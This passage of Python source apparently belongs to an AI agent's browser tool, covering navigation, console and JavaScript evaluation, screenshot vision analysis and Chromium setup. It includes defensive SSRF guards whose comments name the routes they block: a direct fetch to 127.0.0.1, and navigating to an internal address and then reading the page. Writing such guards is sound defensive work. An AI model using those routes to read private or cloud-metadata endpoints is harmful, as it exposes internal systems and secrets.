        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    return _tool_response(result, {"scrolled": direction}, f"Failed to scroll {direction}")


def browser_back(task_id: Optional[str] = None) -> str:
    """Navigate back in browser history."""
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_back
        return camofox_back(task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success") and _eval_ssrf_guard_active(effective_task_id):
        # History can land on a private/internal/cloud-metadata address the
        # navigate preflight never saw (earlier redirect chain, manipulated
        # client-side history). Re-check post-navigation like every other
        # content-returning entry point — the floor fires for every backend.
        _blocked_url = _current_page_private_url(effective_task_id)
        if _blocked_url:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: page URL targets a private or internal address "
                    f"({_blocked_url}). Browser history navigation (back) "
                    "landed on this address."
                ),
            }, ensure_ascii=False)
    return _tool_response(result, {"url": result.get("data", {}).get("url", "")}, "Failed to go back")


def browser_press(key: str, task_id: Optional[str] = None) -> str:
    """Press a keyboard key (e.g. "Enter", "Tab")."""
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_press
        return camofox_press(key, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "press")
    if blocked is not None:
        return blocked
    result = _run_browser_command(effective_task_id, "press", [key])
    return _tool_response(result, {"pressed": key}, f"Failed to press {key}")


def _blocked_private_page_action(effective_task_id: str, action: str) -> Optional[str]:
    """Return a blocked payload when an unsafe cloud page would receive input."""
    if not _eval_ssrf_guard_active(effective_task_id):
        return None
    blocked_url = _current_page_private_url(effective_task_id)
    if not blocked_url:
        return None
    return json.dumps({
        "success": False,
        "error": (
            "Blocked: page URL targets a private or internal address "
            f"({blocked_url}). Refusing to {action} on this page in this "
            "browser mode."
        ),
    }, ensure_ascii=False)


def _blocked_private_page_json(blocked_url: str) -> str:
    """Blocked payload for content-returning tools whose page was eval-navigated private."""
    return json.dumps({
        "success": False,
        "error": (
            "Blocked: page URL targets a private or internal address "
            f"({blocked_url}). This may have been caused by a "
            "JavaScript navigation via browser_console."
        ),
    }, ensure_ascii=False)


def _blocked_private_page_content(effective_task_id: str) -> Optional[str]:
    """Blocked payload when the SSRF guard is active and the current page is private, else None.

    Sibling of the snapshot/vision/eval/get_images guards: after any eval that
    may have changed ``location.href`` to a private address, returning page
    content would expose it. Fail-open on probe failure (see
    ``_current_page_private_url``).
    """
    if not _eval_ssrf_guard_active(effective_task_id):
        return None
    blocked_url = _current_page_private_url(effective_task_id)
    return _blocked_private_page_json(blocked_url) if blocked_url else None


def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Console messages + uncaught JS errors (optionally ``clear``ing the buffers),
    or — when ``expression`` is given — evaluate JS in the page like the DevTools console."""
    # --- JS evaluation mode ---
    if expression is not None:
        policy_error = _enforce_browser_eval_policy(expression)
        if policy_error:
            return json.dumps({"success": False, "error": policy_error}, ensure_ascii=False)
        return _browser_eval(expression, task_id)

    # --- Console output mode (original behaviour) ---
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_console
        return camofox_console(clear, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    blocked = _blocked_private_page_content(effective_task_id)
    if blocked is not None:
        return blocked

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": _redact_browser_output(msg.get("text", "")),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": _redact_browser_output(err.get("message", "")),
                "source": "exception",
            })

    response = {
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


from tools.browser_tool_eval_policy import (  # noqa: F401
    _eval_ssrf_guard_active,
    _JS_URL_LITERAL_RE,
    _expression_targets_private_url,
    _current_page_private_url,
    _RISKY_BROWSER_EVAL_PATTERNS,
    _JS_STRING_LITERAL_RE,
    _SENSITIVE_BROWSER_EVAL_TOKENS,
    _allow_unsafe_browser_evaluate,
    _restrict_browser_evaluate,
    _decode_js_string_literal,
    _decoded_js_string_literals,
    _sensitive_browser_eval_token_reason,
    _risky_browser_eval_reason,
    _enforce_browser_eval_policy,
    _camofox_current_page_private_url,
)


def _parse_eval_value(raw_result: Any) -> Any:
    """Eval returns the JS value as a string; parse valid JSON so the model gets structured data."""
    if isinstance(raw_result, str):
        try:
            return json.loads(raw_result)
        except (json.JSONDecodeError, ValueError):
            pass  # keep as string
    return raw_result


def _eval_supervisor_fast_path(effective_task_id: str, expression: str) -> Optional[str]:
    """Run ``Runtime.evaluate`` on the CDP supervisor's persistent WebSocket.

    Zero subprocess startup cost vs spawning ``agent-browser eval``. Returns a
    tool JSON string when the supervisor produced a definitive answer (a value,
    a blocked private page, or a real JS-side exception — which is NOT retried
    through the subprocess, that would just reproduce it slower), or None to
    fall through to the subprocess path (no supervisor, supervisor-side failure,
    import error), so behaviour is unchanged when no supervisor is running.
    """
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
        if supervisor is None:
            return None
        sup_result = supervisor.evaluate_runtime(expression)
        if sup_result.get("ok"):
            parsed = _parse_eval_value(sup_result.get("result"))
            # Post-eval page-URL recheck: if this (or a prior) eval navigated
            # the page to a private address, withhold the result.
            blocked = _blocked_private_page_content(effective_task_id)
            if blocked is not None:
                return blocked
            response = {
                "success": True,
                "result": _redact_browser_output(parsed),
                "result_type": type(parsed).__name__,
                "method": "cdp_supervisor",
            }
            return json.dumps(response, ensure_ascii=False, default=str)
        err = sup_result.get("error") or "evaluate_runtime failed"
        if "supervisor" not in err.lower():
            return json.dumps({"success": False, "error": err}, ensure_ascii=False)
        logger.debug(
            "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
            err,
        )
    except ImportError:
        pass
    except Exception as exc:  # pragma: no cover — defensive
        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)
    return None


def _eval_failure_response(result: Dict[str, Any]) -> str:
    """Tool JSON for a failed ``agent-browser eval``, with actionable rewrites of known errors."""
    err = result.get("error", "eval failed")
    if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
        # Backend capability gap — give the model a clear signal.
        err = f"JavaScript evaluation is not supported by this browser backend. {err}"
    elif "reference chain is too long" in err.lower():
        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP.
        # The supervisor fast path retries with returnByValue=false; the CLI
        # subprocess can't, so replace the cryptic protocol error with guidance.
        err = (
            "Expression returned a live DOM node / NodeList / Window, "
            "which can't be serialized. Extract a primitive value "
            "(e.g. .innerText, .href, .src, .value) or use "
            "JSON.stringify() / a snapshot tool instead."
        )
    return json.dumps(_copy_fallback_warning({"success": False, "error": err}, result))


def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate a JavaScript expression in the page context and return the result.

    Private-network guard, both sub-paths gated on the same condition: the
    literal pre-scan closes direct fetches (``fetch('http://127.0.0.1/...')``,
    which never update ``location.href``); the post-eval page-URL recheck
    closes navigate-then-read (``location.href = ...`` then read the DOM) —
    eval returns arbitrary JS results directly, never via snapshot/vision.
    """
    effective_task_id = _last_session_key(task_id or "default")

    if _eval_ssrf_guard_active(effective_task_id):
        blocked_literal = _expression_targets_private_url(expression)
        if blocked_literal:
            return json.dumps({
                "success": False,
                "error": (
                    "Blocked: JavaScript expression targets a private or "
                    f"internal address ({blocked_literal}). Reading internal "
                    "endpoints via browser_console is not permitted in this "
                    "browser mode."
                ),
            }, ensure_ascii=False)

    # Camofox keeps its own raw-``task_id``-keyed session map, so pass the raw
    # id (matching every other Camofox tool) rather than the resolved
    # agent-browser session key.  The literal pre-scan above already ran.
    if _is_camofox_mode():
        return _camofox_eval(expression, task_id)

    fast = _eval_supervisor_fast_path(effective_task_id, expression)
    if fast is not None:
        return fast

    result = _run_browser_command(effective_task_id, "eval", [expression])
    if not result.get("success"):
        return _eval_failure_response(result)

    parsed = _parse_eval_value(result.get("data", {}).get("result"))
    response = {
        "success": True,
        "result": _redact_browser_output(parsed),
        "result_type": type(parsed).__name__,
    }
    # Post-eval page-URL recheck (mirrors the supervisor path).
    blocked = _blocked_private_page_content(effective_task_id)
    if blocked is not None:
        return blocked
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)


def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate JS via Camofox's /tabs/{tab_id}/evaluate endpoint (if available)."""
    from tools.browser_camofox import _ensure_tab, _post
    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        user_id = tab_info["user_id"]
        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": user_id})

        # Camofox returns the result in a JSON envelope
        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            try:
                parsed = json.loads(raw_result)
            except (json.JSONDecodeError, ValueError):
                pass

        if _eval_ssrf_guard_active(task_id or "default"):
            _blocked_url = _camofox_current_page_private_url(tab_id, user_id)
            if _blocked_url:
                return _blocked_private_page_json(_blocked_url)

        return json.dumps({
            "success": True,
            "result": _redact_browser_output(parsed),
            "result_type": type(parsed).__name__,
        }, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # Graceful degradation — server may not support eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. "
                         "Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str):
    """Start recording if browser.record_sessions is enabled in config."""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        from hermes_cli.config import read_raw_config
        hermes_home = get_hermes_home()
        cfg = read_raw_config()
        record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = hermes_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """Stop recording if one is active for this session."""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: Optional[str] = None) -> str:
    """List the page's images (src, alt, natural size), excluding data: URIs."""
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_get_images
        return camofox_get_images(task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Use eval to run JavaScript that extracts images
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        # ── Private-network guard (sibling of snapshot/vision/eval guards) ──
        blocked = _blocked_private_page_content(effective_task_id)
        if blocked is not None:
            return blocked

        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            # Parse the JSON string returned by JavaScript
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            response = {
                "success": True,
                "images": _redact_browser_output(images),
                "count": len(images)
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get images")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


_LP_VISION_FALLBACK_REASON = (
    "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
)


def _vision_mode_label() -> str:
    _cp = _get_cloud_provider()
    return "local" if _cp is None else f"cloud ({_cp.provider_name()})"


def _lightpanda_vision_preroute(
    effective_task_id: str, annotate: bool, screenshot_path: Path,
) -> Tuple[bool, Optional[str], Path]:
    """Capture the vision screenshot through the Chrome fallback when Lightpanda is the engine.

    Lightpanda has no graphical renderer, so the normal path would fail with a
    CDP error or return a placeholder PNG. Returns ``(prerouted, fallback_warning,
    screenshot_path)``; on fallback failure ``prerouted`` is False and the caller
    takes the normal screenshot path (forcing Chrome) so ``_run_browser_command``
    still produces the standard fallback metadata/error.
    """
    engine = _get_browser_engine()
    if engine != "lightpanda" or not _should_inject_engine(engine):
        return False, None, screenshot_path
    logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
    screenshot_args = ["--annotate"] if annotate else []
    fb_result = _chrome_fallback_screenshot(effective_task_id, screenshot_args, _get_command_timeout())
    fb_result = _annotate_lightpanda_fallback(fb_result, _LP_VISION_FALLBACK_REASON)
    if not fb_result.get("success"):
        logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
        return False, None, screenshot_path
    fb_path = fb_result.get("data", {}).get("path", "")
    if fb_path and os.path.exists(fb_path):
        import uuid as uuid_mod
        from hermes_constants import get_hermes_dir

        screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
        screenshots_dir.mkdir(parents=True, exist_ok=True)
        persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
        shutil.copy2(fb_path, persistent_path)
        screenshot_path = persistent_path
    return True, fb_result.get("fallback_warning"), screenshot_path


def _native_vision_result(
    screenshot_path: Path, question: str, annotate: bool,
    result: Dict[str, Any], lp_fallback_warning: Optional[str],
) -> Dict[str, Any]:
    """Multimodal tool-result envelope: the main model inspects the pixels itself.

    History-reuse cap: this embed is baked into the tool result and re-sent on
    every later turn, exactly like vision_analyze's native path — apply the same
    proactive resize so full-res screenshots can't enter immutable history
    uncapped. The helper's stat/dimension quick-estimate skips the resize when
    already under both caps; without Pillow it fails open to the raw bytes.
    """
    from tools.vision_tools import (
        _EMBED_MAX_DIMENSION,
        _EMBED_TARGET_BYTES,
        _build_native_vision_tool_result,
        _resize_image_for_vision,
    )

    data_url = _resize_image_for_vision(
        screenshot_path,
        mime_type="image/png",
        max_base64_bytes=_EMBED_TARGET_BYTES,
        max_dimension=_EMBED_MAX_DIMENSION,
        force_jpeg=True,
    )
    native_result = _build_native_vision_tool_result(
        image_url=str(screenshot_path),
        question=question,
        image_data_url=data_url,
        image_size_bytes=screenshot_path.stat().st_size,
    )
    meta = native_result.setdefault("meta", {})
    meta["screenshot_path"] = str(screenshot_path)
    if lp_fallback_warning:
        meta["fallback_warning"] = lp_fallback_warning
    if annotate and result.get("data", {}).get("annotations"):
        meta["annotations"] = result["data"]["annotations"]
    native_result["text_summary"] = (
        f"{native_result.get('text_summary', '')} "
        f"Screenshot path: {screenshot_path}"
    ).strip()
    return native_result


def _analyze_screenshot_with_aux_llm(screenshot_path: Path, question: str) -> str:
    """One-shot aux vision-LLM analysis (not baked into history), secret-redacted.

    Encodes at full resolution; on a size-related provider rejection the image
    is downscaled once and retried. Timeout/temperature come from
    ``auxiliary.vision.*`` — local vision models (llama.cpp, ollama) can take
    well over 30s, so the default timeout is generous.
    """
    import base64

    vision_prompt = (
        f"You are analyzing a screenshot of a web browser.\n\n"
        f"User's question: {question}\n\n"
        f"Provide a detailed and helpful answer based on what you see in the screenshot. "
        f"If there are interactive elements, describe them. If there are verification challenges "
        f"or CAPTCHAs, describe what type they are and what action might be needed. "
        f"Focus on answering the user's specific question."
    )
    _screenshot_bytes = screenshot_path.read_bytes()
    _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
    data_url = f"data:image/png;base64,{_screenshot_b64}"
    vision_model = _get_vision_model()
    logger.debug("browser_vision: analysing screenshot (%d bytes)",
                 len(_screenshot_bytes))

    vision_timeout = 120.0
    vision_temperature = 0.1
    try:
        from hermes_cli.config import load_config
        _vision_cfg = cfg_get(load_config(), "auxiliary", "vision", default={})
        _vt = _vision_cfg.get("timeout")
        if _vt is not None:
            vision_timeout = float(_vt)
        _vtemp = _vision_cfg.get("temperature")
        if _vtemp is not None:
            vision_temperature = float(_vtemp)
    except Exception:
        pass

    call_kwargs = {
        "task": "vision",
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": vision_prompt},
                    {"type": "image_url", "image_url": {"url": data_url}},
                ],
            }
        ],
        "temperature": vision_temperature,
        "timeout": vision_timeout,
    }
    if vision_model:
        call_kwargs["model"] = vision_model
    try:
        response = _lazy_call_llm(**call_kwargs)
    except Exception as _api_err:
        from tools.vision_tools import (
            _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
        )
        if not (_is_image_size_error(_api_err) and len(data_url) > _RESIZE_TARGET_BYTES):
            raise
        logger.info(
            "Vision API rejected screenshot (%.1f MB); "
            "auto-resizing to ~%.0f MB and retrying...",
            len(data_url) / (1024 * 1024),
            _RESIZE_TARGET_BYTES / (1024 * 1024),
        )
        data_url = _resize_image_for_vision(screenshot_path, mime_type="image/png")
        call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
        response = _lazy_call_llm(**call_kwargs)

    analysis = (response.choices[0].message.content or "").strip()
    # Redact secrets the vision LLM may have read from the screenshot.
    from agent.redact import redact_sensitive_text
    return redact_sensitive_text(analysis)


def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
    """Screenshot the current page for visual inspection (CAPTCHAs, images, layouts).

    Native-vision models get the screenshot attached to the conversation (a
    multimodal tool-result envelope); otherwise the auxiliary vision model
    returns a text analysis as JSON. Either way the file is saved persistently
    and its path returned so it can be shared via MEDIA:<path>.
    ``annotate`` overlays numbered [N] labels on interactive elements.
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_vision
        return camofox_vision(question, annotate, task_id)

    import uuid as uuid_mod
    from hermes_constants import get_hermes_dir
    screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # ── Private-network guard: block vision from eval-navigated private pages ──
    blocked = _blocked_private_page_content(effective_task_id)
    if blocked is not None:
        return blocked

    _lp_prerouted, _lp_fallback_warning, screenshot_path = _lightpanda_vision_preroute(
        effective_task_id, annotate, screenshot_path,
    )

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)
        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = _annotate_lightpanda_fallback(
                {"success": True, "data": {"path": str(screenshot_path)}},
                _LP_VISION_FALLBACK_REASON,
            )
        else:
            screenshot_args = ["--annotate"] if annotate else []
            screenshot_args += ["--full", str(screenshot_path)]
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # If the Lightpanda pre-route already failed, force Chrome so
                # _run_browser_command doesn't trigger a redundant LP fallback.
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            error_response = {
                "success": False,
                "error": f"Failed to take screenshot ({_vision_mode_label()} mode): {error_detail}"
            }
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        if not screenshot_path.exists():
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path} ({_vision_mode_label()} mode). "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)

        # Fast path: native image routing for the active main model — attach the
        # screenshot directly instead of describing it through an aux vision LLM
        # (no aux call, no information loss; consistent with vision_analyze).
        from tools.vision_tools import _should_use_native_vision_fast_path

        if _should_use_native_vision_fast_path():
            return _native_vision_result(screenshot_path, question, annotate, result, _lp_fallback_warning)

        analysis = _analyze_screenshot_with_aux_llm(screenshot_path, question)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        _copy_fallback_warning(response_data, result)
        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # Keep the screenshot if it was captured — the failure is in the vision
        # analysis, not the capture, and deleting it loses evidence the user may
        # need. The 24-hour cleanup bounds disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


# ============================================================================
# Cleanup and Management Functions
# ============================================================================


# ============================================================================
# Requirements Check
# ============================================================================


# Cache for Chromium discovery. Invalidated by _reset_browser_caches.
_cached_chromium_installed: Optional[bool] = None


def _chromium_search_roots() -> List[str]:
    """Directories to scan for a Chromium / headless-shell build, in the order
    agent-browser and Playwright probe them: ``PLAYWRIGHT_BROWSERS_PATH``, then
    Playwright's per-OS default cache."""
    roots: List[str] = []
    env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA") or os.path.join(
            home, "AppData", "Local"
        )
        roots.append(os.path.join(local, "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """Return True when a usable Chromium (or headless-shell) build is on disk.

    Checks ``AGENT_BROWSER_EXECUTABLE_PATH``, then system Chrome/Chromium on
    PATH, then Playwright's cache (``chromium-*`` / ``chromium_headless_shell-*``
    dirs). Without a binary the CLI hangs on first use until the command
    timeout fires, so the tool must not be advertised.
    """
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. AGENT_BROWSER_EXECUTABLE_PATH — explicit user-configured browser
    ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
    if ab_path and (os.path.isfile(ab_path) or shutil.which(ab_path)):
        _cached_chromium_installed = True
        return True

    # 2. System Chrome/Chromium in PATH (common names)
    system_chrome = (
        shutil.which("google-chrome")
        or shutil.which("chromium")
        or shutil.which("chromium-browser")
        or shutil.which("chrome")
    )
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright browser cache (legacy — chromium-* / chromium_headless_shell-* dirs)
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright names them ``chromium-<build>`` and
        # ``chromium_headless_shell-<build>``; agent-browser accepts either.
        for entry in entries:
            if entry.startswith("chromium-") or entry.startswith(
                "chromium_headless_shell-"
            ):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


# One-shot per process: a 170MB download that fails (or is slow) must not be
# retried on every browser call. Reset by _reset_browser_caches() for tests.
_chromium_autoinstall_attempted = False


def _maybe_autoinstall_chromium() -> bool:
    """Best-effort, gated download of the Chromium *binary* on local cold start.

    Binary only (``agent-browser install``), never ``--with-deps`` — that shells
    ``apt`` and needs root, so missing system libraries stay a user action.
    Gated by ``security.allow_lazy_installs``, skipped in Docker (Chromium ships
    in the image), attempted once per process. True only when Chromium is
    present afterwards.
    """
    global _chromium_autoinstall_attempted
    if _chromium_autoinstall_attempted:
        return _chromium_installed()
    _chromium_autoinstall_attempted = True

    if _running_in_docker():
        return False

    from tools.lazy_deps import _allow_lazy_installs
    if not _allow_lazy_installs():
        return False

    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return False

    if _is_npx_agent_browser_sentinel(browser_cmd):
        install_cmd = [
            _resolve_npx_bin() or "npx", "--ignore-scripts", "-y", AGENT_BROWSER_NPX_SPEC, "install",
        ]
    else:
        install_cmd = [browser_cmd, "install"]

    logger.info(
        "browser: Chromium missing — auto-installing the browser binary "
        "(one-time ~170MB; disable via security.allow_lazy_installs)"
    )
    try:
        proc = subprocess.run(
            install_cmd,
            capture_output=True,
            text=True, encoding='utf-8', errors='replace',
            timeout=600,
            env=_build_browser_env(),
        )
    except (OSError, subprocess.SubprocessError) as e:
        logger.warning("browser: Chromium auto-install failed to start: %s", e)
        return False

    if proc.returncode != 0:
        tail = (proc.stderr or proc.stdout or "").strip()[-300:]
        logger.warning(
            "browser: Chromium auto-install exited %s: %s", proc.returncode, tail
        )
        return False

    global _cached_chromium_installed
    _cached_chromium_installed = None
    return _chromium_installed()


def _running_in_docker() -> bool:
    """Best-effort detection of whether we're inside a Docker container."""
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", "rt", encoding="utf-8") as fp:
            return "docker" in fp.read()
    except OSError:
        return False


def check_browser_requirements() -> bool:
    """Whether the browser tools should be advertised.

    Local mode needs the ``agent-browser`` CLI plus a Chromium build (except
    Lightpanda-only text workflows); cloud mode needs the CLI plus provider
    credentials (the provider hosts its own Chromium).
    """
    # Browser Use CLI backend — browser_exec replaces the whole browser_*
    # surface (including browser_cdp/browser_dialog, whose check_fns funnel
    # through here), so hide these tools from the model.
    if _is_browser_use_cli_mode():
        return False

    # Camofox backend — only needs the server URL, no agent-browser CLI
    if _is_camofox_mode():
        return True

    # CDP override mode can connect to an existing remote/local browser endpoint
    # without requiring the local agent-browser binary on PATH.
    # Raw (no-I/O) check: this runs during tool-schema assembly at startup,
    # where a stale endpoint must not cost a blocking HTTP probe.
    if _get_cdp_override_raw():
        return True

    # The agent-browser CLI is required for local launch and cloud-provider flows.
    # Tool-schema assembly runs during Desktop startup; do not execute
    # ``agent-browser --version`` here, because Windows .cmd shims route through
    # cmd.exe and can flash a console before the user invokes any browser tool.
    # Actual browser execution paths still validate the candidate before use.
    try:
        browser_cmd = _find_agent_browser(validate=False)
    except FileNotFoundError:
        return False

    # On Termux, the bare npx fallback is too fragile to treat as a satisfied
    # local browser dependency. Require a real install (global or local) so the
    # browser tool is not advertised as available when it will likely fail on
    # first use.
    if _requires_real_termux_browser_install(browser_cmd):
        return False

    # In cloud mode, also require provider credentials. Cloud browsers
    # don't need a local Chromium binary.
    provider = _get_cloud_provider()
    if provider is not None:
        return provider.is_configured()

    # Local mode with Lightpanda can provide text/navigation tools without a
    # local Chromium install. Chrome fallback, screenshots, and browser_vision
    # will still return actionable Chromium install errors if invoked.
    if _using_lightpanda_engine():
        return True

    # Local Chrome mode: agent-browser needs a Chromium build on disk. Without
    # it the CLI hangs on first use until the command timeout fires.
    return _chromium_installed()


def check_browser_vision_requirements() -> bool:
    """Advertise ``browser_vision`` only with BOTH a working browser AND a vision
    backend — otherwise it fails at call time with a cryptic provider error."""
    if not check_browser_requirements():
        return False
    try:
        from tools.vision_tools import check_vision_requirements
    except ImportError:
        return False
    return check_vision_requirements()


# ============================================================================
# Module Test
# ============================================================================

if __name__ == "__main__":
    """
    Simple test/demo when run directly
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    _cp = _get_cloud_provider()
    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
    print(f"   Mode: {mode}")

    # Check requirements
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            browser_cmd = _find_agent_browser()
            if _requires_real_termux_browser_install(browser_cmd):
                print("   - bare npx fallback found (insufficient on Termux local mode)")
                print(f"     Install: {_browser_install_hint()}")
            elif _cp is None and not _chromium_installed():
                print("   - Chromium browser binary not found")
                searched = ", ".join(_chromium_search_roots()) or "(no candidate paths)"
                print(f"     Searched: {searched}")
                if _running_in_docker():
                    print(
                        "     Docker: pull the latest image — the current one "
                        "predates the bundled Chromium install"
                    )
                    print("       docker pull ghcr.io/nousresearch/hermes-agent:latest")
                else:
                    print("     Install it with:")
                    print("       npx agent-browser install --with-deps")
                    print("     Or:  npx playwright install --with-deps chromium")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")
